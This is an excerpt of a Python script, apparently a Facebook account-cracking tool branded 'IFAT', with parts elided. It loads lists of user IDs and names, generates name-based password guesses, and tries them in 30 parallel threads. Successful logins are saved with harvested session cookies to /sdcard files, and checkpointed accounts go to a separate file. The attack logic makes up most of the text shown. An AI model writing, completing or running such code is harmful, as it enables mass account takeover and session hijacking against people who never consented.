...
sys.stdout.write('\x1b]2; IFAT\x07')
...
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46m[CREATOR]  \x1b[1;97m● \033[38;5;84m[\x1b[1;95mIFAT-143\033[38;5;84m]
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/IFAT.txt');linex()
    ...
    def methodA(self, sid, name, psw):
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);IFATb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={IFATb};{ckkk}"
                    print(f"\r\r{G1}[IFAT-OK] {sid} | {ps} ")
                    open('/sdcard/IFAT-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[IFAT-CP] {sid} | {ps} ")
                     open('/sdcard/IFAT-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}SAWG-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);IFATb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={IFATb};{ckkk}"
                    print(f"\r\r{G1}[IFAT-OK] {sid} | {ps} ")
                    open('/sdcard/IFAT-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[IFAT-CP] {sid} | {ps} ")
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            linex()
            with Habib(max_workers=30) as IFATworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                IFATworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                IFATworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[IFAT-OK] {uid} | {pas}')
